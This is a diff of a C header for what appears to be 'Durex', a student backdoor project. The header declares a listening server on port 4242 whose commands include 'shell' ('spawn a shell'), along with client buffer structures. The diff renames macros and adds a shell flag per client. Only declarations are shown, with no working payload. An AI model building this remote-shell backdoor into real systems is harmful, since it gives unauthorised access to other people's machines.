@@ -6,15 +6,12 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/06/28 08:16:36 by root              #+#    #+#             */
-/*   Updated: 2018/07/19 04:39:15 by root             ###   ########.fr       */
+/*   Updated: 2018/07/20 08:44:57 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #ifndef DUREX_H
 # define DUREX_H
-
-# define CLIENT_MAX		3
-# define CLIENT_BUFF	128
 
 /* memset strcpy */
 # include <string.h>
@@ -26,13 +23,15 @@
 # define SERVER_REPORTER	"/var/log/Durex.log"
 # define SERVER_ADDR		"localhost"
 # define SERVER_PORT		"4242"
+# define SERVER_CLIENT_MAX	3
+# define SERVER_CLIENT_BUFF	128
 # define SERVER_COMMANDS	"help", "shell", "quit"
 # define SERVER_HELP		"display this help", "spawn a shell", "quit server"
 # define SERVER_FUNCTIONS	&serverHelp, &serverShell, &serverQuitClient
 
 typedef struct	s_buff
 {
-	char		buff[CLIENT_BUFF];
+	char		buff[SERVER_CLIENT_BUFF];
 	char		*head;
 	char		*tail;
 }				t_buff;
@@ -41,6 +40,7 @@ typedef struct	s_cl
 {
 	int			fd;
 	int			logged;
+	int			shell;
 	t_buff		rd;
 	t_buff		wr;
 }				t_cl;
@@ -51,7 +51,7 @@ typedef struct	s_sv
 	int			fd;
 	fd_set		fdr;
 	fd_set		fdw;
-	t_cl		client[CLIENT_MAX];
+	t_cl		client[SERVER_CLIENT_MAX];
 }				t_sv;
 
 int				openServer(const char *addr, const char *port);
